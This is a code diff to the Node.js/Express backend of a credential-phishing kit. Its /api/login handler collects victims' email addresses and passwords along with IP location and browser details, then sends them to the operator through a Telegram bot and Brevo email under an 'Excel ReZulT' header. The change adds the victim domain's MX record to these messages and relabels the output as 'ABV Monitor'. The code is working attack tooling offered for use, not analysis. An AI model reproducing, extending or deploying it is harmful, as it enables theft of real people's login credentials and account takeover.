@@ -17,7 +17,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-// TELEGRAM CONFIGURATION (FROM ENVIRONMENT VARIABLES)
+// TELEGRAM CONFIGURATION
 // ============================================================
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -29,16 +29,15 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const BREVO_API_KEY = process.env.BREVO_API_KEY;
 const SENDER_EMAIL = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
-const SENDER_NAME = process.env.SENDER_NAME || 'ABV check';
+const SENDER_NAME = process.env.SENDER_NAME || 'ABV Monitor';
 
-// Email recipients (comma-separated in env)
 const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
     .split(',')
     .map(e => e.trim())
     .filter(Boolean);
 
 // ============================================================
-// VALIDATION - Show startup config
+// STARTUP CONFIG CHECK
 // ============================================================
 
 console.log('========================================');
@@ -51,10 +50,10 @@ console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_R
 console.log('========================================');
 
 // ============================================================
-// HELPER: Send Email via Brevo HTTP API
+// HELPER: Send Email via Brevo (WITH MX RECORD)
 // ============================================================
 
-async function sendEmail(email, password, ipInfo, userAgent, domain) {
+async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord) {
     if (!BREVO_API_KEY) {
         console.log('⚠️ Brevo API key missing, skipping email');
         return false;
@@ -78,6 +77,7 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
             .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
             .label { font-weight: bold; color: #555; }
             .value { color: #1e930c; font-size: 16px; }
+            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
             .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
         </style>
     </head>
@@ -88,6 +88,7 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
                 <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
                 <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
                 <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
+                <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
                 <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
                 <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
                 <div class="field"><div class="label">📱 Browser:</div><div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div></div>
@@ -105,6 +106,7 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
 📧 Email: ${email}
 🔑 Password: ${password}
 🌐 Domain: ${domain || 'Unknown'}
+📨 MX Record: ${mxRecord || 'Unknown'}
 🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
 📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
 📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
@@ -145,7 +147,7 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
 }
 
 // ============================================================
-// HELPER: Send to Telegram
+// HELPER: Send to Telegram (WITH MX RECORD)
 // ============================================================
 
 async function sendToTelegram(message) {
@@ -253,7 +255,10 @@ app.post('/api/login', async (req, res) => {
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const acceptLanguage = req.headers['accept-language'] || 'Unknown';
 
-    // ---------- Telegram ----------
+    // ============================================================
+    // 1) TELEGRAM MESSAGE (includes MX Record)
+    // ============================================================
+
     const telegramMessage = `
 --------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
 Email : ${email}
@@ -271,11 +276,17 @@ Date : ${new Date().toISOString()}
     console.log('📤 Sending to Telegram...');
     const telegramResult = await sendToTelegram(telegramMessage);
 
-    // ---------- Email via Brevo ----------
-    console.log('📧 Sending email via Brevo...');
-    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain);
+    // ============================================================
+    // 2) EMAIL (includes MX Record)
+    // ============================================================
 
-    // ---------- Response ----------
+    console.log('📧 Sending email via Brevo...');
+    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord);
+
+    // ============================================================
+    // RESPONSE
+    // ============================================================
+
     const telegramOK = !!(telegramResult && telegramResult.ok);
     if (telegramOK || emailResult) {
         console.log('✅ Notifications sent successfully');
